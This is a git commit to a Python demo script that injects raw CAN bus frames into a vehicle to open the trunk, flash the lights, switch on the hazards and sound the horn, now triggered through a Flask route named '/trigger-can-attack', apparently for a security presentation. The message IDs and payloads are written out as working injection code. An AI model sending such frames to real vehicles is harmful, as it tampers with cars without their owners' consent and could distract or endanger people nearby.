2704e4e9e11c4af7ba63e52dad5090ca4ba56032
Jakob Löw <jakob.loew@thi.de>
2022-04-01 09:43:32 +0200

    :sparkles: transform the demo into a web server so you can trigger the demo via a click in the presentation

--- demo.py
+++ demo.py
@@ -1,6 +1,10 @@
 import can
 import time
 from binascii import unhexlify
+from flask import Flask, render_template
+from threading import Thread
+
+app = Flask(__name__)
 
 # ip link set can0 type can bitrate 500000
 # ip link set up can0
@@ -11,20 +15,37 @@ LIGHTS_FLASH = can.Message(arbitration_id=0x3B3, data=unhexlify("888205000000600
 HAZARD_LIGHTS = can.Message(arbitration_id=0x3C2, data=unhexlify("0855555500005545"), is_extended_id=False)
 HONK_HORN = can.Message(arbitration_id=0x3C2, data=unhexlify("0455555500005545"), is_extended_id=False)
 
-bus.send(TRUNK_OPENCLOSE)
-time.sleep(0.1)
-bus.send(HAZARD_LIGHTS)
-time.sleep(1)
+def perform_demo():
+    time.sleep(2)
 
-for i in range(500):
-    if i < 100:
-        bus.send(HONK_HORN)
-    if i % 50 == 0:
-        bus.send(LIGHTS_FLASH)
+    bus.send(TRUNK_OPENCLOSE)
+    time.sleep(0.1)
+    bus.send(HAZARD_LIGHTS)
+    time.sleep(1)
 
-    time.sleep(0.01)
+    for i in range(500):
+        if i < 100:
+            bus.send(HONK_HORN)
+        if i % 50 == 0:
+            bus.send(LIGHTS_FLASH)
 
-time.sleep(5)
-bus.send(HAZARD_LIGHTS)
-time.sleep(1)
-bus.send(TRUNK_OPENCLOSE)
+        time.sleep(0.01)
+
+    time.sleep(5)
+    bus.send(HAZARD_LIGHTS)
+    time.sleep(1)
+    bus.send(TRUNK_OPENCLOSE)
+
+@app.route('/')
+def index():
+    return 'nope'
+
+@app.route('/trigger-can-attack')
+def perform_attack():
+    t = Thread(target=perform_demo, daemon=True)
+    t.start()
+
+    return render_template("hacking-in-progress.html")
+
+if __name__ == '__main__':
+    app.run(port=3000)
